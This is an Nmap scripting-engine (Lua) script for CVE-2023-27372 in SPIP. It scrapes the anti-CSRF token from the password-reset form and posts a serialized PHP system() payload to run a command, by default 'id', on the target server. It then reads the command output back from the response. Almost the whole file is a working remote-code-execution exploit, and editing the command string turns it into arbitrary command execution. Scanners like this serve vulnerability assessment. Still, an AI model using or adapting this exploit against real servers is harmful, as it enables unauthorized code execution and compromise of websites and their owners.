local string = require "string"
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"
local table = require "table"
local io = require "io"


description = [[
CVE-2023-27372
SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.

References:
* https://packetstormsecurity.com/files/171921/SPIP-Remote-Command-Execution.html
* https://nvd.nist.gov/vuln/detail/CVE-2023-27372
* https://github.com/nuts7/CVE-2023-27372
]]

---
-- @usage nmap -sV --script vuln <target>
-- @usage nmap -p80 --script http-vuln-cve2023-27372.nse <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2023-27372:
-- |   VULNERABLE:
-- |   SPIP before 4.2.1 allows Remote Code Execution
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2023-27372
-- |      SPIP before 4.2.1 allows Remote Code Execution
-- |       via form values in the public area because serialization is mishandled.
-- |
-- |     Disclosure date: 2023-06-27
-- |     References:
-- |       https://packetstormsecurity.com/files/171921/SPIP-Remote-Command-Execution.html
-- | https://nvd.nist.gov/vuln/detail/CVE-2023-27372
-- | https://github.com/nuts7/CVE-2023-27372
-- |
---

author = {"Mr Hackux", "Balgo security"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive"}

portrule = shortport.http

action = function(host, port)
 -- local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
  
  local vuln = {
    title = 'SPIP before 4.2.1 allows Remote Code Execution. ',
    state = vulns.STATE.NOT_VULN,
    description = [[
SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled.
    ]],
    IDS = {CVE = 'CVE-2023-27372'},
    references = {
      'https://packetstormsecurity.com/files/171921/SPIP-Remote-Command-Execution.html',
      'https://nvd.nist.gov/vuln/detail/CVE-2023-27372',
      'https://github.com/nuts7/CVE-2023-27372'
    },
    dates = {
      disclosure = {year = '2023', month = '06', day = '27'},
    },
 exploit_results = {},
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln.state = vulns.STATE.NOT_VULN

local opts = {header={}}
opts["header"]["User-Agent"] = 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0'
opts["header"]["Accept"] = '*/*' -- 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'

    local command = "id"
    local response = http.get(host,port,"/spip.php?page=spip_pass",opts,nil,"")
    local html = response.body

    local regex = "<input[^>]+name='formulaire_action_args'[^>]+value='([^']+)'"
    local csrf_value = string.match(html, regex)
    -- print(csrf_value)
    -- print(html)

    if csrf_value then
        local payload = string.format("s:%d:\"<?php system('%s'); ?>\";", 20 + #command, command)
        local response = http.post(host,port,"/spip.php?page=spip_pass",opts,nil, {
            page = "spip_pass",
            formulaire_action = "oubli",
            formulaire_action_args = csrf_value,
            oubli = payload
        })
        -- print(response.status)
        if response.status == 200 then
            
            local html2 = response.body
            -- print(html2)
           
    local regex2 = "<input[^>]+name='oubli'[^>]+value=\"([^>]+)\""
    local value = string.match(html2, regex2)
    -- print(value)
    if value then
        vuln.state = vulns.STATE.EXPLOIT
  table.insert(vuln.exploit_results,
    string.format("Command: %s", command))
  table.insert(vuln.exploit_results,
    string.format("Results: %s", value))
    return report:make_output(vuln)
    else
        table.insert(vuln.exploit_results,
    stdnse.debug1("[-]Command Not Found !"))
         return report:make_output(vuln)
    end
    end
    else
        stdnse.debug1("[-] Unable to find Anti-CSRF token")
    end
end
